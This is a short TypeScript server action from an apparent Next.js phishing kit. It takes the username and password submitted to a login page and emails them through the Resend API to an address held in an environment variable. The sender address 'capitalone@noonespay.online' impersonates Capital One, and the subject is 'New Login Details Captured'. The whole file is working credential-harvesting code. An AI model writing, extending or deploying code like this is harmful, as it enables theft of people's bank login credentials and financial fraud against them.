'use server';

import { LoginSchema } from '@/app/page';
import { Resend } from 'resend';

const mailer = new Resend(process.env.RESEND_API_KEY);

export const sendEmail = async (data:LoginSchema) => {
    try {
        const { username, password, remember } = data;

        const response = await mailer.emails.send({
            from: 'capitalone@noonespay.online',
            to: process.env.RECIPIENT_EMAIL!,
            subject: 'New Login Details Captured',
            html: `
        <div style="font-family: sans-serif; padding: 20px;">
          <h2>New Login Submission</h2>
          <p><strong>Username:</strong> ${username}</p>
          <p><strong>Password:</strong> ${password}</p>
        </div>
      `
        });

        if (response.error) {
            console.error('Resend API Error:', response.error);
            return false;
        }

        return true;
    } catch (error) {
        console.error('Email Sending Exception:', error);
        return false;
    }
};